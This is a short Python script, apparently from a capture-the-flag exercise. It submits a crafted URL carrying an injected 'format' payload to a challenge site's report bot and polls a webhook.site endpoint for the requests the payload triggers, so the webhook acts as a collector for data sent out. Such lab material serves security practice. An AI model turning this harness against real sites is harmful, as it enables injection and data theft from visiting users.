import requests, urllib.parse, sys, time
BASE="https://polynomial.secso.cc"
TOK="<webhook-token>"
payload = sys.argv[1]
label = sys.argv[2] if len(sys.argv)>2 else "run"
qs=urllib.parse.urlencode({"x":"1","y":"2","formula":"x+y","format":payload,"autoEval":"1"})
path="/?"+qs
for attempt in range(6):
    r=requests.post(BASE+"/report", data={"url":path}, timeout=25)
    print(f"[{label}] REPORT:", r.status_code, r.text.strip()[:80], flush=True)
    if r.status_code==202: break
    time.sleep(6)
# poll
deadline=time.time()+180
seen=set()
start=time.time()
while time.time()<deadline:
    try:
        d=requests.get(f"https://webhook.site/token/{TOK}/requests?sorting=newest", timeout=20).json()
        for it in d.get('data',[]):
            k=it['uuid']
            if k in seen: continue
            seen.add(k)
            ua=str(it.get('headers',{}).get('user-agent'))
            if 'curl' in ua: continue
            print(f"[{label}] HIT({int(time.time()-start)}s):", it['method'], it['url'], flush=True)
            print("      REF:", it.get('headers',{}).get('referer'), flush=True)
    except Exception as e:
        print("poll err", e, flush=True)
    time.sleep(5)
print(f"[{label}] poll done", flush=True)
